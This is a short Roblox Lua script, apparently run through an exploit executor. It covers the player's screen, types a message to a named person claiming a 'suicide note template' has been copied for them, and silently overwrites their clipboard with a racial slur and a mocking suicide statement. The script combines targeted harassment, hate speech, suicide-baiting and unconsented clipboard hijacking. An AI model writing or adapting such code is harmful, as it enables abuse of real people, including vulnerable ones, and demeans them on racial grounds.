-- Create a ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create an ImageLabel to cover the screen
local imageLabel = Instance.new("ImageLabel")
imageLabel.Parent = screenGui
imageLabel.Size = UDim2.new(1, 0, 1, 0)
imageLabel.Position = UDim2.new(0, 0, 0, 0)
imageLabel.BackgroundTransparency = 1
imageLabel.Image = "rbxassetid://15194374849"
imageLabel.ImageColor3 = Color3.fromRGB(255, 255, 255)
imageLabel.ImageTransparency = 0 

-- Create a TextLabel
local textLabel = Instance.new("TextLabel")
textLabel.Parent = screenGui
textLabel.Size = UDim2.new(0, 400, 0, 150)
textLabel.Position = UDim2.new(0.5, -200, 0.5, -75)
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.BackgroundTransparency = 1
textLabel.Font = Enum.Font.SourceSans
textLabel.TextSize = 80
textLabel.Text = ""

local function typeText(text, delay)
    for i = 1, #text do
        textLabel.Text = string.sub(text, 1, i)
        wait(delay)
    end
end

local function copyToClipboard(text)
    pcall(function()
        setclipboard(text)
    end)
end

local screenText = "Hello Curtis Alexander Lamont Tyrell\nI Have Added A Suicide Note Template\nTo Your Clipboard Enjoy 🔪🩸"

local clipboardText = "L Nigger I Killed Myslef Hameed Put Me In A Splif"

typeText(screenText, 0.1)

copyToClipboard(clipboardText)
